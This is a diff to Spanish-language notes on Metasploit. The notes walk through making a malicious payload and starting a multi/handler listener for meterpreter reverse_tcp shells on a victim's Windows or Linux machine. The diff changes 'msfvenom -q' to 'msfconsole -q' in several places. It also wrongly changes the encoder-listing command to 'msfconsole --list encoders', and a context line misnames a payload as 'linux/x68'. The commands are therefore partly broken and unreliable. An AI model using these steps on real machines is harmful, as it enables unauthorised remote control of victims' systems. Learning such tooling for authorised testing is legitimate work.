@@ -37,7 +37,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
 # Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
 
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                 # q = Quitar el banner de inicio
 
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
@@ -76,7 +76,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
 # Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
 
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                   # q = Quitar el banner de inicio
 
 	❯ use multi/handler                 
 	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
@@ -96,7 +96,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 * Shellcode: Es una pieza de código típicamente usada como un payload para explotación. 
 
 ```bash 
-❯ msfvenom --list encoders               # Lista de encoders
+❯ msfconsole --list encoders               # Lista de encoders
 ```
 
 ### Para Windows 
@@ -125,7 +125,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
 # Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
 
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use multi/handler                 
 	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
@@ -157,7 +157,7 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
 # Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
 
-❯ msfvenom -q                  # q = Quitar el banner de inicio
+❯ msfconsole -q                   # q = Quitar el banner de inicio
 
 	❯ use multi/handler                 
 	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
